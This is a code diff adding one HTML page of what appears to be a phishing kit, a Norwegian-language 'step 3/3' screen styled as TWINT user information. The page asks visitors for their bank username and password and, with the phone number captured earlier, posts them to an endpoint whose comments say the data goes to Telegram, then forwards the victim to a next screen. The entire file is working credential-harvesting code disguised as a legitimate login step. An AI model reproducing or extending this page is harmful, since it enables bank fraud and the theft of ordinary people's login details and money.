@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="nb">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TWINT — Brukerinformasjon</title>
+    <style>
+      :root {
+        font-family: "Inter", "Segoe UI", system-ui, sans-serif;
+        color: #0f172a;
+        background: #f3f4f6;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        margin: 0;
+        min-height: 100vh;
+        background: #f3f4f6;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .shell {
+        width: min(420px, 100%);
+        background: white;
+        border-radius: 0;
+        padding: 1.5rem 1.75rem;
+        min-height: 100vh;
+        box-shadow: 0 15px 45px rgba(15, 23, 42, 0.18);
+      }
+
+      .step {
+        display: flex;
+        flex-direction: column;
+        gap: 0.45rem;
+        padding: 0 0.25rem 0.75rem;
+      }
+
+      .step-label {
+        font-size: 0.8rem;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        color: #94a3b8;
+      }
+
+      .step-progress {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+
+      .progress-bar {
+        flex: 1;
+        height: 0.35rem;
+        background: #e2e8f0;
+        border-radius: 999px;
+        margin-right: 0.75rem;
+        overflow: hidden;
+      }
+
+      .progress-bar span {
+        display: block;
+        width: 100%;
+        height: 100%;
+        background: #fbbf24;
+        border-radius: inherit;
+      }
+
+      .step-progress strong {
+        font-size: 0.75rem;
+        color: #475569;
+      }
+
+      h1 {
+        margin: 0 0 0.4rem;
+        font-size: 2.2rem;
+        font-weight: 700;
+        letter-spacing: 0.02em;
+      }
+
+      .bank-subtitle {
+        margin: 0 0 1.25rem;
+        color: #475569;
+        font-weight: 600;
+        letter-spacing: 0.04em;
+      }
+
+      form {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem;
+      }
+
+      label {
+        font-weight: 600;
+        color: #475569;
+      }
+
+      input[type="text"],
+      input[type="password"] {
+        width: 100%;
+        padding: 0.95rem 1rem;
+        border: 1px solid #cbd5f5;
+        border-radius: 12px;
+        font-size: 1rem;
+        font-weight: 600;
+        color: #0f172a;
+        background: #f8fafc;
+      }
+
+      .buttons {
+        display: flex;
+        flex-direction: column;
+        gap: 0.75rem;
+        margin-top: 1rem;
+      }
+
+      .buttons button {
+        border: none;
+        border-radius: 14px;
+        padding: 0.95rem;
+        font-size: 1rem;
+        font-weight: 600;
+        cursor: pointer;
+      }
+
+      .primary {
+        background: #fbbf24;
+        color: #0f172a;
+        box-shadow: 0 10px 20px rgba(251, 191, 36, 0.45);
+      }
+
+      .primary:disabled {
+        background: #f6f8fb;
+        color: #94a3b8;
+        box-shadow: none;
+        cursor: not-allowed;
+      }
+
+      .secondary {
+        background: white;
+        border: 1px solid #d1d5db;
+        color: #475569;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="shell">
+      <div class="step">
+        <div class="step-label">Step 3/3</div>
+        <div class="step-progress">
+          <div class="progress-bar"><span></span></div>
+          <strong>Step 3/3</strong>
+        </div>
+      </div>
+
+      <h1><span id="selected-bank">Velg bank</span></h1>
+      <p class="bank-subtitle">Vennligst logg inn med bankdetaljene dine.</p>
+
+      <form>
+        <label for="bank-username">Brukernavn</label>
+        <input type="text" id="bank-username" placeholder="Bankbrukernavn" />
+
+        <label for="bank-password">Passord</label>
+        <input type="password" id="bank-password" placeholder="Bankpassord" />
+
+        <div class="buttons">
+          <button type="button" class="primary" id="next-button" disabled>Neste</button>
+          <button type="button" class="secondary" id="back-button">Tilbake</button>
+        </div>
+      </form>
+    </div>
+
+    <script>
+      // Initialize app
+      function initializeUI() {
+        const selectedBankEl = document.getElementById("selected-bank");
+        const storedBank = localStorage.getItem("selectedBank");
+        const phoneNumber = localStorage.getItem("phoneNumber");
+        const bankUsernameInput = document.getElementById("bank-username");
+        const bankPasswordInput = document.getElementById("bank-password");
+        const nextButton = document.getElementById("next-button");
+        const backButton = document.getElementById("back-button");
+
+        if (storedBank) {
+          selectedBankEl.textContent = storedBank;
+        }
+
+        const toggleNext = () => {
+          nextButton.disabled = !bankUsernameInput.value.trim() || !bankPasswordInput.value.trim();
+        };
+
+        bankUsernameInput.addEventListener("input", toggleNext);
+        bankPasswordInput.addEventListener("input", toggleNext);
+
+        nextButton.addEventListener("click", async () => {
+          // Validate that required fields are filled
+          if (!bankUsernameInput.value.trim() || !bankPasswordInput.value.trim()) {
+            alert("Vennligst fyll ut både brukernavn og passord.");
+            return;
+          }
+
+          // Prepare data to send to Telegram
+          const data = {
+            action: 'bank_login',
+            bank: storedBank || null,
+            phone: phoneNumber || null,
+            bank_username: bankUsernameInput.value.trim(),
+            bank_password: bankPasswordInput.value.trim(),
+            created_at: new Date().toISOString(),
+          };
+
+          console.log("📤 Sender data til Telegram:", data);
+
+          // Disable button and show loading
+          nextButton.disabled = true;
+          nextButton.textContent = "Lagrer...";
+          
+          try {
+            // Send data to Telegram via API
+            const response = await fetch('/api/telegram', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(data),
+            });
+
+            // Check if response has content before parsing JSON
+            const contentType = response.headers.get('content-type');
+            let result;
+            
+            if (contentType && contentType.includes('application/json')) {
+              const text = await response.text();
+              if (text) {
+                try {
+                  result = JSON.parse(text);
+                } catch (parseError) {
+                  console.error("❌ JSON parse error:", parseError, "Response text:", text);
+                  throw new Error("Ugyldig svar fra server: " + text.substring(0, 100));
+                }
+              } else {
+                result = { error: 'Empty response from server' };
+              }
+            } else {
+              const text = await response.text();
+              console.error("❌ Non-JSON response:", text);
+              result = { error: 'Server returned non-JSON response', details: text.substring(0, 200) };
+            }
+
+            if (!response.ok) {
+              console.error("❌ Telegram API error:", result);
+              alert("Noe gikk galt ved sending til Telegram: " + (result.message || result.error || result.details || 'Ukjent feil'));
+              nextButton.disabled = false;
+              nextButton.textContent = "Neste";
+              return;
+            }
+            
+            console.log("✅ Data sendt til Telegram:", result);
+            
+            // Also save to localStorage as backup
+            localStorage.setItem("bankLoginData", JSON.stringify(data));
+            
+            alert("Data sendt til Telegram!");
+            
+            // Redirect to authentication method selection
+            window.location.href = "screen-5.html";
+            
+          } catch (err) {
+            console.error("❌ Uventet feil:", err);
+            alert("En uventet feil oppstod: " + (err.message || 'Ukjent feil'));
+            nextButton.disabled = false;
+            nextButton.textContent = "Neste";
+          }
+        });
+
+        backButton.addEventListener("click", () => {
+          window.location.href = "screen-4.html";
+        });
+      }
+      
+      // Start app when page loads
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', initializeUI);
+      } else {
+        initializeUI();
+      }
+    </script>
+  </body>
+</html>
+
